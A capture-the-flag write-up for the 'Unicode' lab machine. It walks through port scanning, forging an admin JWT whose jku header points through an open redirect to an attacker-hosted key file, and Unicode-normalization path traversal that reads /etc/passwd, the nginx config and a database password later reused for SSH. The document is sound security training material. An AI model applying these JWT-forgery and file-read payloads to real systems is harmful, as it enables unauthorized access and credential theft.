# Unicode

# Enumeration

````
nmap -sCV -p22,80 --min-rate 1000 10.10.11.126 -oA nmap-10.10.11.126-sCV
Starting Nmap 7.92 ( https://nmap.org ) at 2022-03-23 06:18 EDT
Nmap scan report for unicode.htb (10.10.11.126)
Host is up (0.15s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 fd:a0:f7:93:9e:d3:cc:bd:c2:3c:7f:92:35:70:d7:77 (RSA)
|   256 8b:b6:98:2d:fa:00:e5:e2:9c:8f:af:0f:44:99:03:b1 (ECDSA)
|_  256 c9:89:27:3e:91:cb:51:27:6f:39:89:36:10:41:df:7c (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-generator: Hugo 0.83.1
|_http-title: Hackmedia
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.45 seconds
````

````
# wfuzz -u 'http://unicode.htb/FUZZ' -w /root/Downloads/subdomains-top1million-110000.txt --hl 514
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://unicode.htb/FUZZ
Total requests: 114441

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                 
=====================================================================

000000107:   308        3 L      24 W       258 Ch      "upload"                                                                                             
000000468:   308        3 L      24 W       262 Ch      "register"                                                                                          
000002707:   308        3 L      24 W       256 Ch      "debug"                                                                                              
000009283:   308        3 L      24 W       258 Ch      "logout"                                                                                             
000025933:   308        3 L      24 W       260 Ch      "pricing"                                                                                             
000047706:   200        68 L     162 W      2078 Ch     "#smtp"
````

Create a user and login
````
POST /login/ HTTP/1.1
Host: unicode.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 29
Origin: http://unicode.htb
Connection: close
Referer: http://unicode.htb/login/
Upgrade-Insecure-Requests: 1

username=blah&password=bugsam
````

````
HTTP/1.1 302 FOUND
Server: nginx/1.18.0 (Ubuntu)
Date: Wed, 23 Mar 2022 10:22:11 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 228
Connection: close
Location: http://unicode.htb/dashboard/
Set-Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy9qd2tzLmpzb24ifQ.eyJ1c2VyIjoiYmxhaCJ9.g1K_hychzS7mTBSAnra1_WY1iMWs9SpzFsBsvEapubKQXIg6bG5zBnTyicFZ7v3nMf7VD0mBUoor2G8Sc5255OT-yGCDATs-xCo5z_9Q0rX2aVcjslpY0YjOdkvBztXI76tBEOtfYwjs2VQ2GWzdvA_r1H8vkIR2Qw3lpQ4MJVAHldqoL23uCu1KMQYhYeh6EuRMiI697PGCo4BCojLYVugfzgJhkWWyEH7jRDOu4C05JW3RMsJryAvM2om_ndv8SVj8NFNZBf1HMjiltUNtFgRI1708xRfxK-yUS3F1P0eWoEIDWdM01S6CzIuKWYnYAQlJHiDS3mPzx6wfsLfiqA; Path=/

<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 3.2 Final//EN">
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to target URL: <a href="/dashboard/">/dashboard/</a>. If not click the link.
````


# User

[pyjwt](https://pyjwt.readthedocs.io/en/stable/usage.html)
````python
>>> import jwt
>>> payload =
'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy9qd2tzLmpzb24ifQ.eyJ1c2VyIjoiYmxhaCJ9.g1K_hychzS7mTBSAnra1_WY1iMWs9SpzFsBsvEapubKQXIg6bG5zBnTyicFZ7v3nMf7VD0mBUoor2G8Sc5255OT-yGCDATs-xCo5z_9Q0rX2aVcjslpY0YjOdkvBztXI76tBEOtfYwjs2VQ2GWzdvA_r1H8vkIR2Qw3lpQ4MJVAHldqoL23uCu1KMQYhYeh6EuRMiI697PGCo4BCojLYVugfzgJhkWWyEH7jRDOu4C05JW3RMsJryAvM2om_ndv8SVj8NFNZBf1HMjiltUNtFgRI1708xRfxK-yUS3F1P0eWoEIDWdM01S6CzIuKWYnYAQlJHiDS3mPzx6wfsLfiqA'
>>> jwt.get_unverified_header(payload)
{'typ': 'JWT', 'alg': 'RS256', 'jku': 'http://hackmedia.htb/static/jwks.json'}
>>> jwt.decode(payload, options={"verify_signature": False})
{'user': 'blah'}
````
:new: http://hackmedia.htb/static/jwks.json

````json
{
    "keys": [
        {
            "kty": "RSA",
            "use": "sig",
            "kid": "hackthebox",
            "alg": "RS256",
            "n": "AMVcGPF62MA_lnClN4Z6WNCXZHbPYr-dhkiuE2kBaEPYYclRFDa24a-AqVY5RR2NisEP25wdHqHmGhm3Tde2xFKFzizVTxxTOy0OtoH09SGuyl_uFZI0vQMLXJtHZuy_YRWhxTSzp3bTeFZBHC3bju-UxiJZNPQq3PMMC8oTKQs5o-bjnYGi3tmTgzJrTbFkQJKltWC8XIhc5MAWUGcoI4q9DUnPj_qzsDjMBGoW1N5QtnU91jurva9SJcN0jb7aYo2vlP1JTurNBtwBMBU99CyXZ5iRJLExxgUNsDBF_DswJoOxs7CAVC5FjIqhb1tRTy3afMWsmGqw8HiUA2WFYcs",
            "e": "AQAB"
        }
    ]
}
````

## JKU claims misuse

jwks.json
````json
{
    "keys": [
        {
            "kty": "RSA",
            "use": "sig",
            "kid": "hackthebox",
            "alg": "RS256",
            "n": "luNxcMI3qzbUkABS-Fd7QDQhGsinO3x8Unkdw2p40fzoCUBoJ4EhugAzERfNuYgpg2rHT2OnJGh5uyO-TAiIBTpcckyVgvFolk0l_wBcX9LqFJQwBPtcOB4jG4AdvVY7MqFsEALR4FBV3HCWYDKiPwxMRs-SO2RyrKI5zA-lPcZF7QgH0rIMGl8KH9PemRbYxg3KAl-gcbX0PBM6jkGdj67K-N6XxxfwmzZrcf6E-2Y1PPq-LfA4iZX5Ij9FXy_6SJfKGYH5NcZzx0ufFaF8hwVUHmfY7asFWPC8SqzVIDH3-IjnwAlyNR2YugChfPzIfyiIeJcLX0agUUghqK9WTw",
            "e": "AQAB"
        }
    ]
}
````

Using the function http://hackmedia.htb/redirect/?url=google.com it is possible to redirect the server to retrieve our JWT

````python
import json
from authlib.jose import JsonWebKey
from authlib.jose import jwt

rsaKey = JsonWebKey.generate_key(kty="RSA", crv_or_size=2048, is_private=1)

json_object = json.loads(rsaKey.as_json())
json_formatted_str = json.dumps(json_object, indent=2)
print(json_formatted_str)

header = {'typ': 'JWT',
          'alg': 'RS256',
          'jku': 'http://hackmedia.htb/static/../redirect?url=10.10.15.6/jwks.json'
          }
payload = {
     'user': 'admin'
}
serialized = jwt.encode(header=header, payload=payload, key=rsaKey)
print(serialized)
````

````json
//jku
{
  "n": "2Fi6an3ZufhA9erAQcVmlkaWMbwCus3VCk1WAGy3pnPv0kzh3U0rtnb7RsKVpGM0obYlIS2YgqQSQoH1mALD_teZD0AOZtzbqObKr4RDKjuyCkwnEkjO26BkdGpkBJAJkjRFwp3iCHT2EVU9T961MdPNK0ipEooAR7j-ztlxE3nZ3Lzynl0akIAOpZqgiGLy1z_qJkohg8v-AJKZzva3mfYagRMIMvu5PxRU9lO-dB1z9MVBmhHdQV_cr_D8SmyzwkU0oyH0LiwLONpEvTvvnzen2yTf1DZWMswSTI_tNB70QzaVwGvvP5CEEwGCBwNKUu2jPrtjsM3tmLM1YR4o5Q",
  "e": "AQAB",
  "kty": "RSA",
  "kid": "SKjzQRS3IklFQNxIVBWDu4rIP8yvFH8z9SBxcGwzZ9I"
}
````

````python
##jwt
b'eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy8uLi9yZWRpcmVjdD91cmw9MTAuMTAuMTUuNi9qd2tzLmpzb24ifQ.eyJ1c2VyIjoiYWRtaW4ifQ.izcfGUdFu6U8qPV2-yfRHSCQ0plQOrYk9rMZi7Awn9ow8WCzr5UsSPh18wKPaRzkH3eGQRcih6JSl4fwTUuPUjrh_bISSj6QIQJdCTe01K220nTT1_P8xFMu39dFpwFkdhOwAqRorcLpKjFryMkcXkiQNrwpYPA-eMn6b1DFRwbA3baOGyC8a2pGYUetCgFts_K7h8I_lywBCqS0vMQAeOCw53iskkMUANuJE48wS6gfOXvRane3irAjEqx4NI2QiMzUrFzkJLGFPkP79RyzqlXs1JxyVgjcvprMfapDLip_KEOULDXvsBMJfdBe5yyXOSnnzGQmc3MWxSh4RBBz2Q'
````

````
10.10.11.126 - - [25/Mar/2022 06:23:02] "GET /jwks.json HTTP/1.1" 200 -
````

## Unicode normalization vulnerability

The `page` parameter has a `path traversal + local file inclusion + unicode normalization` vulnerability.

UTF-8: 0xEF 0xB8 0xB0
````http
`GET /display/?page=%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/etc/passwd HTTP/1.1
Host: hackmedia.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy8uLi9yZWRpcmVjdD91cmw9MTAuMTAuMTUuNi9qd2tzLmpzb24ifQ.eyJ1c2VyIjoiYWRtaW4ifQ.izcfGUdFu6U8qPV2-yfRHSCQ0plQOrYk9rMZi7Awn9ow8WCzr5UsSPh18wKPaRzkH3eGQRcih6JSl4fwTUuPUjrh_bISSj6QIQJdCTe01K220nTT1_P8xFMu39dFpwFkdhOwAqRorcLpKjFryMkcXkiQNrwpYPA-eMn6b1DFRwbA3baOGyC8a2pGYUetCgFts_K7h8I_lywBCqS0vMQAeOCw53iskkMUANuJE48wS6gfOXvRane3irAjEqx4NI2QiMzUrFzkJLGFPkP79RyzqlXs1JxyVgjcvprMfapDLip_KEOULDXvsBMJfdBe5yyXOSnnzGQmc3MWxSh4RBBz2Q
Upgrade-Insecure-Requests: 1


````

````
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Fri, 25 Mar 2022 10:52:02 GMT
Content-Type: text/html; charset=utf-8
Connection: close
Content-Length: 1876

root:x:0:0:root:/root:/bin/bash
mysql:x:113:117:MySQL Server,,,:/nonexistent:/bin/false
code:x:1000:1000:,,,:/home/code:/bin/bash
````

## Enumeration
📃http://hackmedia.htb/display/?page=%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/etc/nginx/sites-available/default
````
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Fri, 25 Mar 2022 11:03:31 GMT
Content-Type: text/html; charset=utf-8
Connection: close
Content-Length: 432

limit_req_zone $binary_remote_addr zone=mylimit:10m rate=800r/s;

server{
#Change the Webroot from /home/code/app/ to /var/www/html/
#change the user password from db.yaml
	listen 80;
	error_page 503 /rate-limited/;
	location / {
                limit_req zone=mylimit;
		proxy_pass http://localhost:8000;
		include /etc/nginx/proxy_params;
		proxy_redirect off;
	}
	location /static/{
		alias /home/code/coder/static/styles/;
	}
}
````

📃http://hackmedia.htb/display/?page=%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/home/code/coder/db.yaml
````
HTTP/1.1 200 OK
Server: nginx/1.18.0 (Ubuntu)
Date: Fri, 25 Mar 2022 11:04:09 GMT
Content-Type: text/html; charset=utf-8
Connection: close
Content-Length: 95

mysql_host: "localhost"
mysql_user: "code"
mysql_password: "B3stC0d3r2021@@!"
mysql_db: "user"
````

SSH into machine and...
````
code@code:~$ cat user.txt 
5ecb2ce89e7a1d0f01010095b0e6c99e
````

# Root

# Secrets

* FLAG_USER = 5ecb2ce89e7a1d0f01010095b0e6c99e
* 

https://docs.authlib.org/en/latest/jose/index.html
https://www.compart.com/en/unicode/U+FE30
